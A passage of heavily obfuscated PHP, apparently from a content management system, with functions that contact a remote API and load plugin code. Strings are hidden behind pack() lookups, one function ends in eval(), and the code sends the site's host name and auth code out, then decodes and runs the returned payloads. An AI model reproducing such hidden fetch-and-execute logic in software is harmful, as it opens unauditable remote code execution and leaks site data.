kuan,$C_punlogin,$S_data,$O00O0O,$O0O000,$O0OO00,$OO0O00,$OO0000,$O00OO0;return eval($str);}function ajax($type,$action,$data=""){global $conn,$C_authcode,$C_dirx,$C_admin,$config;if($config->api==pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][01])){$api=pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][2]);}else{$api=$config->api;}$key=pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][0x3]);$sign=md5(pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][0x4]) .$action. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][05]) .$C_authcode. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][6]) .$_SERVER[pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][7])]. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][010]) .$nonestr. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][0x9]) .$type. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][012]) .$key);$info=getbody($api. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][013]),pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][12]) .$_SERVER[pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][7])]. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][05]) .$C_authcode. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][0x9]) .$type. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][012]) .$key. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][0xD]) .$action. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][010]) .$nonestr. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][016]) .$sign. pack($GLOBALS[BdRnZnQ][0],$GLOBALS[BdRnZnQ][15]) .urlencode($data));ready(base64_decode($info));}function plug($p,$f){global $C_dirx,$C_authcode;if(check_auth2($p)){$data=array(pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][01])=>$p,pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][2])=>$f);$data=json_encode($data);$data=base64_encode($data);$path=$C_dirx. pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][3]) .$p. pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][4]) .$f. pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][0x5]);if(is_file($path)){if(substr(file_get_contents($path),0,32)!=md5($C_authcode.$data)){ajax(pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][06]),pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][0x7]),$data);}}else{ajax(pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][06]),pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][0x7]),$data);}return xcode(substr(file_get_contents($path),32),pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][8]),$C_authcode,0);}else{return pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][9]) .$p. pack($GLOBALS[FMDfqyJ][00],$GLOBALS[FMDfqyJ][10]);}}    
?>